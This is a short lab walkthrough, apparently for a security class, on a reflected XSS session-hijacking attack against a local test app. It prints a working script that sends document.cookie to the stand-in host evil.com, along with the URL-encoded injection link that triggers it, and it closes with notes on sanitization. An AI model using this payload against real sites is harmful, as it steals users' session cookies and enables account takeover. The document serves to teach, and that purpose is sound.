Below is the markdown file content with proper formatting:

# Steps to Attempt the Session Hijacking XSS Attack

## Craft the Malicious Payload

The payload to simulate session hijacking is:

```html
<script>
  var i = new Image();
  i.src = "http://evil.com/steal?cookie=" + document.cookie;
</script>
```

This script creates a new image element and sets its source to a URL on an attacker-controlled server (here represented by evil.com), appending the user's cookie as a query parameter.

## Inject the Payload

Append the payload to the vulnerable query parameter. For example, in your browser, enter a URL similar to:

```php-template
http://localhost:3000/?content=<script>var%20i=new%20Image();%20i.src="http://evil.com/steal?cookie="+document.cookie;</script>
```

**Note:** The payload should be URL-encoded as needed by your browser.

## Trigger the Exploit

Press Enter after entering the URL.

The page will render and include the injected payload. Because the user input is not sanitized, the browser will execute the injected script.

Open your browser’s developer tools (F12) and check the Network tab to observe the request. The script attempts to send a request to:

```arduino
http://evil.com/steal?cookie=...
```

...including the simulated cookie value (or your browser’s actual cookie if available).

## Document Your Findings

- Note that the unsanitized reflection of user input allows the script to execute and send cookie data to the specified URL.
- Discuss how an attacker could leverage this vulnerability to hijack user sessions.
- Explain the importance of proper input sanitization and output encoding to prevent such vulnerabilities.
